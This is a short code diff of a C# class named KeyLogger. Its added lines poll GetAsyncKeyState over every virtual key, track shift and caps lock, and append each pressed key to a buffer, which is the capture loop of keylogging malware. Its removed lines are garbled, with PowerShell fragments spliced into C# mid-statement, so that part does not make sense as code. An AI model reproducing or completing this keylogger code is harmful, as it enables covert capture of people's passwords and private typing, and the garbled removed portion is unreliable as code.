@@ -37,11 +37,12 @@ public static class KeyLogger
     {
         for (int vk = 0x01; vk <= 0xFE; vk++)
         {
-      $shift = [Keyboard]::GetAsyncKeyState(0x10)
-    foreach ($vkey in 65..90) {
-        if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {                     $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')s.ContainsKey(vk) && _keyStates[vk];
+                  bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
+            bool caps = System.Windows.Forms.Control.IsKeyLocked(System.Windows.Forms.Keys.CapsLock);
+            bool isPressed = (GetAsyncKeyState(vk) & 0x8000) != 0;
 
-                        if (!(($shift -band 0x8000) -xor $caps)) {    {
+                        if (isPressed && !(_keyStates.ContainsKey(vk) && _keyStates[vk]))
+            {
                 string key = GetKeyString(vk);
                 _buffer.Append(key);
             }
